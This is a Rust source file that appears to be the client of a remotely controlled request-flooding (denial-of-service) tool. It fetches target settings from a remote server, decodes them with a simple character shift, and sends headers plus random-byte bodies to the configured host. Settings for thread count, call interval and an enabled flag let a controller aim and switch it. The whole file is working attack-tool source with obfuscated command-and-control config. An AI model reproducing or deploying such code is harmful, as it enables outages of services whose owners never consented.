use core::str::FromStr;
use std::{
  collections::HashMap,
  error,
  io::Read,
  io::Result as IResult,
  io::Write,
  net::TcpStream,
  time::{SystemTime, UNIX_EPOCH},
};

use openssl::ssl::{SslConnector, SslMethod, SslStream};

static BODY_SEPARATOR: &str = "\r\n\r\n";
static CONFIG_SEPARATOR: &str = ";";
static CONFIG_PAIR_SEPARATOR: &str = "=";
static MAX_BUFFER_CHUNK_SIZE: u32 = 1024;
static CONFIG_DECRYPT_CHAR_LEFT_SHIFT: u8 = 13;

pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;

pub type ConfigMap = HashMap<String, String>;

pub trait ConfigManager<'a> {
  fn safe_get<T>(&self, key: &'a str, default_value: T) -> T
  where
    T: ToString + FromStr;
}

impl<'a> ConfigManager<'a> for ConfigMap {
  fn safe_get<T>(&self, key: &'a str, default_value: T) -> T
  where
    T: ToString + FromStr,
  {
    return self
      .get(key)
      .unwrap_or(&default_value.to_string())
      .parse::<T>()
      .unwrap_or(default_value);
  }
}

#[derive(Debug, Clone)]
pub struct Config {
  pub headers: String,
  pub host: String,
  pub port: u16,
  pub content_length: u32,
  pub thread_count: u16,
  pub call_interval_in_ms: u64,
  pub config_fetch_interval_in_ms: u64,
  pub enabled: bool,
  pub ssl: bool,
}

impl Config {
  pub fn get_addr(&self) -> String {
    format!("{}:{}", self.host, self.port)
  }
}

impl From<ConfigMap> for Config {
  fn from(config_map: ConfigMap) -> Config {
    let conf = Config {
      headers: config_map.safe_get("headers", "GET / HTTP/1.1\nAccept: */*".into()),
      content_length: config_map.safe_get("content_length", 1024),
      thread_count: config_map.safe_get("thread_count", 10),
      call_interval_in_ms: config_map.safe_get("call_interval_in_ms", 100),
      config_fetch_interval_in_ms: config_map.safe_get("config_fetch_interval_in_ms", 3600000),
      host: config_map.safe_get("host", "localhost".into()),
      port: config_map.safe_get("port", 80),
      enabled: config_map.safe_get("enabled", false),
      ssl: config_map.safe_get("ssl", false),
    };

    return conf;
  }
}

#[derive(Debug)]
pub struct Response {
  pub headers: String,
  pub body: String,
}

impl From<String> for Response {
  fn from(s: String) -> Response {
    let res_chunks: Vec<&str> = s.split(BODY_SEPARATOR).collect();

    Response {
      headers: res_chunks[0].to_string(),
      body: res_chunks[1].to_string(),
    }
  }
}

impl Response {
  pub fn decrypted_body(self) -> String {
    decrypt(&self.body)
  }
}

pub trait Connection {
  fn w(&mut self, buf: &[u8]) -> IResult<usize>;
  fn r(&mut self, buf: &mut String) -> IResult<usize>;
}

impl Connection for SslStream<TcpStream> {
  fn w(&mut self, buf: &[u8]) -> IResult<usize> {
    self.write(buf)
  }

  fn r(&mut self, buf: &mut String) -> IResult<usize> {
    self.read_to_string(buf)
  }
}

impl Connection for TcpStream {
  fn w(&mut self, buf: &[u8]) -> IResult<usize> {
    self.write(buf)
  }

  fn r(&mut self, buf: &mut String) -> IResult<usize> {
    self.read_to_string(buf)
  }
}

pub fn get_conf(addr: &str) -> Result<Config> {
  let headers = String::from("GET / HTTP/1.1\nAccept: */*") + BODY_SEPARATOR;
  let mut res = String::new();
  let mut stream = TcpStream::connect(addr)?;

  stream.write(&headers.as_bytes())?;
  stream.read_to_string(&mut res)?;

  let res: Response = Response::from(res);

  let conf = parse_config(&res.decrypted_body());
  let conf = Config::from(conf);

  debug!(format!("Done fetching config {:?}.", conf));

  Ok(conf)
}

pub fn call(conf: &Config) -> Result<Response> {
  let mut stream = create_stream(&conf);
  let body: Vec<u8> = vec![0; conf.content_length as usize]
    .iter()
    .map(|_| gen_random_byte())
    .collect();
  let mut res = String::new();

  stream.w(conf.headers.as_bytes())?;
  stream.w("\n\n".as_bytes())?;

  if conf.content_length > MAX_BUFFER_CHUNK_SIZE {
    for chunk in body.chunks(MAX_BUFFER_CHUNK_SIZE as usize) {
      stream.w(&chunk)?;
    }
  } else {
    stream.w(&body)?;
  }

  stream.w(&[0; 1])?;
  stream.r(&mut res)?;

  debug!(format!("Done calling {}...", conf.get_addr()));

  return Ok(Response::from(res));
}

fn create_stream(conf: &Config) -> Box<dyn Connection> {
  if conf.ssl {
    openssl_probe::init_ssl_cert_env_vars();

    let connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
    let stream = TcpStream::connect(conf.get_addr()).unwrap();
    Box::new(connector.connect(&conf.host, stream).unwrap())
  } else {
    let stream = TcpStream::connect(conf.get_addr()).unwrap();

    Box::new(stream)
  }
}

fn parse_config(s: &str) -> ConfigMap {
  let parsed: ConfigMap = s
    .split(CONFIG_SEPARATOR)
    .map(|line: &str| line.split(CONFIG_PAIR_SEPARATOR).collect())
    .collect::<Vec<Vec<&str>>>()
    .iter()
    .fold(HashMap::<String, String>::new(), |mut conf, pair| {
      if pair.len() == 2 {
        conf.insert(pair[0].trim().to_string(), pair[1].trim().to_string());
      };
      return conf;
    });

  return parsed;
}

fn decrypt(s: &str) -> String {
  return s
    .chars()
    .map(|c| (c as u8 - CONFIG_DECRYPT_CHAR_LEFT_SHIFT as u8) as char)
    .collect::<String>();
}

fn gen_random_byte() -> u8 {
  SystemTime::now()
    .duration_since(UNIX_EPOCH)
    .unwrap()
    .subsec_nanos() as u8
}

#[macro_export]
#[cfg(debug_assertions)]
macro_rules! debug {
  ($x:expr) => {
    dbg!($x)
  };
}

#[macro_export]
#[cfg(not(debug_assertions))]
macro_rules! debug {
  ($x:expr) => {
    std::convert::identity($x)
  };
}
